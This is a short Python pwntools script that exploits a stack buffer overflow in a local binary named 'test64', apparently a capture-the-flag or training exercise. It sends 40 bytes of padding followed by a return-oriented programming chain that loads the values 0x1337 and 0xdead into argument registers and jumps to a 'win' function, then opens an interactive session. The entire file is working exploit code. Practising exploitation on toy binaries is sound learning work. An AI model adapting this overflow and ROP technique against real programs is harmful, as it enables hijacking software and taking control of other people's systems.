from pwn import *

# setup process
p = process("./test64")
context.binary = "./test64"
pause()

win_addr = p64(0x400537)

rdi_addr = p64(0x400603)
rsi_addr = p64(0x400601)

# payload 
payload = b'A' * 40
payload += rdi_addr + p64(0x1337)
payload += rsi_addr + p64(0xdead) + p64(0)
payload += win_addr 

# send payload
p.sendline(payload)
p.interactive()